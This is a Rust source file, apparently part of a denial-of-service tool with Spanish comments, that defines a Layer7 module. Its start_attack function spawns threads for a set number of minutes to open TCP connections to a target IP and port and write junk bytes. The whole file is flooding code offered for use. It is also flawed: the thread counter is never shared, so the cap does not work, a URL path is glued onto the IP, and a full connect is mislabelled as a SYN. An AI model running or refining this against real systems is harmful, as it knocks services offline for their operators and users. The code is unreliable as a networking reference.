use std::sync::atomic::{AtomicUsize, Ordering};
use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::{Duration, Instant};
use rand::Rng;
use crate::utils::system_resources::SystemResources;

pub struct Layer7 {
    running_threads: AtomicUsize,
}

impl Layer7 {
    pub fn new() -> Self {
        Layer7 {
            running_threads: AtomicUsize::new(0),
        }
    }

    pub fn start_attack(ip: &str, port: u16, paths: Vec<&str>, execution_minutes: u64) {
        let layer7 = Layer7::new();
        let end_time = Instant::now() + Duration::from_secs(execution_minutes * 60);

        loop {
            if Instant::now() >= end_time {
                break;
            }

            let max_threads = SystemResources::calculate_max_threads();
            if layer7.running_threads() < max_threads {
                let ip_clone = ip.to_string();
                let paths_clone = paths.clone();
                let layer7_clone = Layer7::new(); // Crear una nueva instancia de Layer7
                let target_ip = format!("{}{}", ip_clone, paths_clone[rand::thread_rng().gen_range(0..paths_clone.len())]);
                thread::spawn(move || {
                    layer7_clone.increment_running_threads();
                    Layer7::send_syn(&target_ip, port);
                    layer7_clone.decrement_running_threads();
                });
            } else {
                thread::sleep(Duration::from_millis(100));
            }
        }
    }

    fn send_syn(target_ip: &str, target_port: u16) {
        match TcpStream::connect((target_ip, target_port)) {
            Ok(mut stream) => {
                // Enviar SYN
                stream.write(&[0; 10]).expect("Error al enviar SYN");
            },
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }

    fn running_threads(&self) -> usize {
        self.running_threads.load(Ordering::SeqCst)
    }

    fn increment_running_threads(&self) {
        self.running_threads.fetch_add(1, Ordering::SeqCst);
    }

    fn decrement_running_threads(&self) {
        self.running_threads.fetch_sub(1, Ordering::SeqCst);
    }
}
